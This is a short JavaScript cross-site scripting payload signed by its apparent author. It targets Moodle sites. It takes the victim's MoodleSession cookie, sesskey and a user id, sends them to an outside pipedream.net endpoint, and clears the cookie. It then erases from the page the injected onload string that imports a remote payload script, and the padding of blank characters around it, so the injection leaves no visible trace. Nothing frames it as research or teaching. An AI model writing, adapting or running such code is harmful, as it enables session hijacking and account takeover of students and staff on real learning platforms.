//btw PWNED BY NZRXHX
const u=document.querySelector('[data-route="view-settings"]').getAttribute('data-route-param');
const t=document.cookie.match(/MoodleSession=([^;]+)/)[1];
const s=M.cfg.sesskey;
fetch('//eoizd5ecl7m1qqn.m.pipedream.net/?c='+t+"&id="+u+"&sesskey="+s;
document.cookie='MoodleSession=;path=/';
(() => {
  const targets = [
    `"onload="import('//nzrxhx.github.io/payloads/payload.js')`,
    `⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`
  ];

  const walker = document.createTreeWalker(
    document.body,
    NodeFilter.SHOW_TEXT,
    null
  );

  let node;
  while ((node = walker.nextNode())) {
    targets.forEach(target => {
      if (node.nodeValue.includes(target)) {
        node.nodeValue = node.nodeValue.replace(target, '');
      }
    });
  }
})();
